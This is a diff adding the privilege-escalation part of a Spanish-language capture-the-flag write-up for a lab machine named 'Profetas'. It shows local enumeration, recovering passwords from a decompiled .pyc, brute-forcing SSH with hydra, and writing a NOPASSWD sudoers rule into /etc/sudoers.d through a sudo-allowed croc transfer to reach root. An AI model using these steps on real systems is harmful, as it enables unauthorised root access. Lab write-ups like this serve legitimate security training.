@@ -222,12 +222,104 @@ Bueno pues ya tenemos un user y un pass para entrar por SSH `jeremias:jeremias`
 
 ## FASE ESCALADA DE PRIVILEGIOS
 
+Probamos:
+- `id` para ver si estamos en algún grupo extraño
+- `sudo -l` para ver si tenemos algún privilegio sudo
+- `find / -perm -4000 2>/dev/null` para binarios SUID
+- intentamos acceder a la base de datos sin exito ya que tenia el puerto 3306 abierto, lo vi con este comando `ss -tulnp`
+
+Lo único raro que veo es un archivo .pyc en su carpeta, asique m,e lo traigo a mi máquina para verlo más detenidamente:
+
+```bash
+scp jeremias@172.17.0.2:/home/jeremias/ezequiel.pyc .
+```
 
 
 
+![Imagen](images/Profetas/27.png)
 
 
+Ya tenemos el python compiled en nuestra máquina vamos a descompilarlo a ver si vemos algo interesante:
 
+vamos a la página `https://pylingual.io/` subimos el archivo y lo descompiamos
+
+
+![Imagen](images/Profetas/28.png)
+
+
+Revisando el código vemos una posible contraseña
+
+
+![Imagen](images/Profetas/29.png)
+
+
+Vamos a intentar conectarnos por ssh como el usuario  ezequiel con todo lo que tenmos, me creo un diccionario de contraseñas:
+
+```bash
+@Pssw0rd!User4dm1n2025!#
+234r3fsd2
+-34fsdrr32
+234r3fsd2-34fsdrr32
+```
+
+y probamos con hydra:
+
+
+![Imagen](images/Profetas/30.png)
+
+
+nos conectamos como ezequiel `ezequiel:234r3fsd2-34fsdrr32`
+
+```bash
+ ssh ezequiel@172.17.0.2
+```
+
+Ya siendo ezequiel, miramos los grupos a los que pertenece, la carpeta personal con un archivo que leemos y da una especie de pista y un privilegio sudo:
+
+
+![Imagen](images/Profetas/31.png)
+
+Como no tengo ni puñetera idea de lo que es croc busco por la red que es, básicamente es una aplicacion que permite transferir archivos entre dos ordenadore, pero...
+como funciona, me toca buscar más información.
+
+
+Vale aquí me lié la manta a la cabeza, porque hay métodos más faciles pero si puedo mandar y recibir archivos, en mi máquina atacante hago un archivo llamado `pwn`
+
+```bash
+echo 'ezequiel ALL=(ALL) NOPASSWD:ALL' > pwn
+```
+para dar todos los permisos a mi usuario que es ezequiel, desde mi máquina atacante subo el archivo y me genera un código:
+
+```bash
+croc send pwn
+```
+
+y en la máquina víctima estando en la ruta `/etc/sudoers.d` recibo el archivo con privilegios sudo:
+
+```bash
+sudo /usr/local/bin/croc
+```
+me pide el código generado en el croco de la máquina atcante lo ponemos y...¡¡¡¡¡tachán!!! acabamos de escribir permisos para mi usuario:
+
+máquina atacante:
+
+
+![Imagen](images/Profetas/32-1.png)
+
+
+![Imagen](images/Profetas/32-2.png)
+
+
+en la máquina víctima:
+
+
+![Imagen](images/Profetas/33.png)
+
+
+Ahora con `sudo su` ya somos root
+
+
+![Imagen](images/Profetas/34.png)
 
 
 
